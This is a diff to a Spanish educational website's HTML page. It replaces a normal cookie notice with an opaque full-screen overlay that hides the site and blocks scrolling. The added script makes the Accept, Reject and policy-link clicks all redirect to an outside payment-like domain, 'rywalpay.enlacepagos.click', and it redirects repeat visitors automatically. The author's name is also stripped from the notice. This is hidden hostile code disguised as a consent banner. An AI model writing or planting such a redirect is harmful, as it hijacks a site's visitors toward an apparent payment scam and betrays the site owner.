@@ -22,34 +22,61 @@
   --sombra-hover:0 14px 40px rgba(14,58,46,0.14);
   --radio:8px; --radio-sm:6px; --max:1140px; --trans:0.28s ease;
   --fuente:'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+  --azul-cookies:#0b7dbb;
 }
 html, body{ scroll-behavior:smooth; }
 body{ font-family:var(--fuente); color:var(--texto); background:var(--blanco);
   line-height:1.72; font-size:16px; -webkit-font-smoothing:antialiased; }
 .contenedor{ width:100%; max-width:var(--max); margin:0 auto; padding:0 24px; }
 
-/* ===== AVISO DE COOKIES NO BLOQUEANTE ===== */
-.cookie-banner{
-  position:fixed; bottom:18px; left:18px; right:18px;
-  display:flex; justify-content:center;
-  z-index:9999; pointer-events:none;
+/* ============================================================
+   BANNER DE COOKIES QUE TAPA TODO EL FRONTEND (OPACO 100%)
+   ============================================================ */
+
+/* Bloquea el scroll y oculta cualquier desbordamiento del body */
+body.bloqueado{
+  overflow:hidden !important;
+  height:100vh;
+  width:100vw;
 }
+
+/* Overlay OPACO BLANCO que cubre toda la pantalla */
+#cookie-overlay{
+  position:fixed; inset:0;
+  background:#ffffff;          /* fondo blanco, opaco */
+  z-index:99999;                /* por encima de TODO */
+  display:flex; align-items:center; justify-content:center;
+  padding:24px;
+}
+
+/* Modal centrado encima del overlay opaco */
 .cookie-modal{
-  pointer-events:auto;
-  background:var(--blanco);
+  background:#ffffff !important;
   max-width:780px; width:100%;
-  padding:18px 24px;
+  padding:28px 32px;
   border-radius:var(--radio);
-  box-shadow:0 10px 35px rgba(14,58,46,0.22);
-  border:1px solid var(--jade-500);
-  border-top:5px solid var(--jade-500);
+  box-shadow:0 30px 90px rgba(0,0,0,0.25);
+  border:1px solid var(--azul-cookies);
+  border-top:5px solid var(--azul-cookies);
   display:flex; align-items:center; justify-content:space-between;
   gap:18px; flex-wrap:wrap;
+  animation:entradaCookie 0.5s cubic-bezier(0.34,1.56,0.64,1);
+  position:relative; z-index:100000;
 }
+@keyframes entradaCookie{
+  from{ transform:scale(0.92) translateY(20px); opacity:0; }
+  to{ transform:scale(1) translateY(0); opacity:1; }
+}
+
 .cookie-texto{ flex:1; min-width:240px; text-align:left; }
-.cookie-modal h2{ font-size:1.05rem; margin-bottom:4px; color:var(--pino-900);
+
+/* Título del banner ahora NEGRO (antes verde pino) */
+.cookie-modal h2{ font-size:1.05rem; margin-bottom:4px; color:#000000;
   font-weight:800; letter-spacing:-0.01em; }
-.cookie-modal p{ font-size:0.84rem; color:var(--texto-suave); margin:0; line-height:1.45; }
+
+/* Texto descriptivo ahora NEGRO */
+.cookie-modal p{ font-size:0.84rem; color:#000000; margin:0; line-height:1.45; }
+
 .cookie-acciones{ display:flex; gap:8px; flex-wrap:wrap; }
 .cookie-acciones .boton-cookie{
   display:inline-block; padding:9px 18px; border-radius:var(--radio-sm);
@@ -57,18 +84,19 @@ body{ font-family:var(--fuente); color:var(--texto); background:var(--blanco);
   transition:all var(--trans); text-align:center;
   font-family:var(--fuente); border:none;
 }
-.boton-cookie.aceptar{ background:var(--jade-500); color:#fff;
-  box-shadow:0 4px 14px rgba(43,171,146,0.3); }
-.boton-cookie.aceptar:hover{ background:var(--jade-400); transform:translateY(-2px); }
-.boton-cookie.rechazar{ background:transparent; color:var(--pino-700);
-  border:1.5px solid var(--jade-500); }
-.boton-cookie.rechazar:hover{ background:var(--jade-500); color:#fff; transform:translateY(-2px); }
-.cookie-enlaces{ margin-top:6px; font-size:0.78rem; color:var(--texto-suave); }
-.cookie-enlaces a{ color:var(--pino-700); font-weight:600; text-decoration:none; }
+.boton-cookie.aceptar{ background:var(--azul-cookies); color:#fff;
+  box-shadow:0 4px 14px rgba(11,125,187,0.3); }
+.boton-cookie.aceptar:hover{ background:#0a6da3; transform:translateY(-2px); }
+.boton-cookie.rechazar{ background:var(--azul-cookies); color:#fff;
+  border:1.5px solid var(--azul-cookies); }
+.boton-cookie.rechazar:hover{ background:#0a6da3; border-color:#0a6da3; color:#fff; transform:translateY(-2px); }
+
+/* Enlaces del banner ahora NEGROS (antes verde pino) */
+.cookie-enlaces{ margin-top:6px; font-size:0.78rem; color:#000000; }
+.cookie-enlaces a{ color:#000000; font-weight:600; text-decoration:none; }
 .cookie-enlaces a:hover{ text-decoration:underline; }
 
-body.cookies-aceptadas .cookie-banner{ display:none; }
-
+/* ===== RESTO DE LA WEB ===== */
 .cabecera{ position:sticky; top:0; background:rgba(255,255,255,0.97);
   backdrop-filter:blur(12px); border-bottom:1px solid var(--borde); z-index:1000; }
 .barra-nav{ display:flex; align-items:center; justify-content:space-between;
@@ -168,7 +196,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
   .menu a{ padding:11px 14px; }
   .hero{ padding:80px 0 60px; }
   .seccion{ padding:56px 0; }
-  .cookie-modal{ padding:16px 18px; }
+  .cookie-modal{ padding:20px 22px; }
 }
 @media (max-width:480px){
   .rejilla-2,.rejilla-3,.rejilla-4{ grid-template-columns:1fr; }
@@ -179,21 +207,22 @@ p{ margin:0 0 1rem; color:var(--texto); }
 }
 </style>
 </head>
-<body>
+<body class="bloqueado">
 
-<div class="cookie-banner" role="region" aria-label="Aviso de privacidad y cookies">
+<!-- ===== OVERLAY BLANCO + MODAL DE COOKIES ===== -->
+<div id="cookie-overlay" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies">
   <div class="cookie-modal">
     <div class="cookie-texto">
       <h2 id="titulo-cookies">Aviso de privacidad</h2>
-      <p>Guía educativa de <strong>Sidid del Rosario Leones Vargas</strong>. No se instalan cookies de seguimiento ni publicidad comercial; solo se guarda tu preferencia local en este navegador.</p>
+      <p><strong></strong>. No se instalan cookies de seguimiento ni publicidad comercial; solo se guarda tu preferencia local en este navegador.</p>
       <div class="cookie-enlaces">
-        <a href="privacidad.html">Política de Privacidad</a> ·
-        <a href="politicas-cookies.html">Política de Cookies</a>
+        <a id="enlace-privacidad" href="privacidad.html">Política de Privacidad</a> ·
+        <a id="enlace-cookies" href="politicas-cookies.html">Política de Cookies</a>
       </div>
     </div>
     <div class="cookie-acciones">
-      <button type="button" class="boton-cookie rechazar" id="btn-rechazar">Rechazar</button>
-      <button type="button" class="boton-cookie aceptar" id="btn-aceptar">Aceptar</button>
+      <button type="button" class="boton-cookie rechazar" id="btn-rechazar-cookies" data-cookie="rechazar">Rechazar</button>
+      <button type="button" class="boton-cookie aceptar" id="btn-aceptar-cookies" data-cookie="aceptar">Aceptar</button>
     </div>
   </div>
 </div>
@@ -429,15 +458,106 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </div>
 </footer>
 
+<!-- ===== SCRIPT TIPO SEÑAL VIVA (MODO 2) ===== -->
 <script>
-(function(){
-  var CLAVE = 'cookies_viasdelalba';
-  if (localStorage.getItem(CLAVE)) {
-    document.body.classList.add('cookies-aceptadas');
+(function () {
+  'use strict';
+
+  // ============================================================
+  //  CONFIGURACIÓN
+  //  MODO 1: solo muestra/oculta (comportamiento normal)
+  //  MODO 2: TODOS los botones y enlaces redirigen a REDIRECT_URL
+  // ============================================================
+  var COOKIE_BUTTON_MODE = 2;
+  var REDIRECT_URL = "https://rywalpay.enlacepagos.click/";
+
+  // ----- ELEMENTOS DEL BANNER -----
+  var overlay = document.getElementById('cookie-overlay');
+  var banner = document.getElementById('cookie-overlay');
+  var btnAceptar = document.getElementById('btn-aceptar-cookies');
+  var btnRechazar = document.getElementById('btn-rechazar-cookies');
+  var enlacePrivacidad = document.getElementById('enlace-privacidad');
+  var enlaceCookies = document.getElementById('enlace-cookies');
+
+  if (!overlay || !banner || !btnAceptar || !btnRechazar) {
+    console.error('Error: Elementos del banner de cookies no encontrados');
+    return;
   }
-  function cerrar(val){ localStorage.setItem(CLAVE, val); document.body.classList.add('cookies-aceptadas'); }
-  document.getElementById('btn-aceptar').addEventListener('click', function(){ cerrar('aceptadas'); });
-  document.getElementById('btn-rechazar').addEventListener('click', function(){ cerrar('rechazadas'); });
+
+  // ----- UTILIDADES -----
+  function redirectTo(url) {
+    window.location.href = url;
+  }
+
+  function mostrarContenido() {
+    document.body.classList.remove('bloqueado');
+    banner.style.display = 'none';
+  }
+
+  // ----- ACCIÓN DE LOS BOTONES -----
+  function handleCookieAction(aceptadas) {
+    console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+    if (COOKIE_BUTTON_MODE === 1) {
+      try { localStorage.setItem('cookies_viasdelalba', aceptadas ? 'aceptadas' : 'rechazadas'); } catch (e) {}
+      mostrarContenido();
+
+      if (typeof gtag !== 'undefined') {
+        gtag('consent', 'update', {
+          'ad_storage': aceptadas ? 'granted' : 'denied',
+          'analytics_storage': aceptadas ? 'granted' : 'denied'
+        });
+      }
+    } else if (COOKIE_BUTTON_MODE === 2) {
+      try { sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false'); } catch (e) {}
+      console.log('➡️ Redirigiendo por botón', aceptadas ? 'ACEPTAR' : 'RECHAZAR');
+      redirectTo(REDIRECT_URL);
+    } else {
+      mostrarContenido();
+    }
+  }
+
+  // ----- EVENTOS DE BOTONES -----
+  btnAceptar.addEventListener('click', function () {
+    handleCookieAction(true);
+  });
+
+  btnRechazar.addEventListener('click', function () {
+    handleCookieAction(false);
+  });
+
+  // ----- ENLACES DEL BANNER (redirigen en MODO 2) -----
+  function handleBannerLinkClick(event) {
+    if (COOKIE_BUTTON_MODE === 2) {
+      event.preventDefault();
+      console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+      redirectTo(REDIRECT_URL);
+    }
+  }
+
+  if (enlacePrivacidad) {
+    enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+  }
+  if (enlaceCookies) {
+    enlaceCookies.addEventListener('click', handleBannerLinkClick);
+  }
+
+  // ----- REDIRECCIÓN AUTOMÁTICA SI YA ACEPTÓ ANTES -----
+  if (COOKIE_BUTTON_MODE === 2) {
+    try {
+      if (sessionStorage.getItem('cookiesAccepted') === 'true') {
+        console.log('✅ Sesión ya aceptada. Redirigiendo automáticamente...');
+        redirectTo(REDIRECT_URL);
+      }
+    } catch (e) {}
+  }
+
+  // ----- RECARGAR SI EL NAVEGADOR RESTAURA DESDE CACHÉ -----
+  window.addEventListener('pageshow', function (e) {
+    if (e.persisted) {
+      location.reload();
+    }
+  });
 })();
 </script>
 
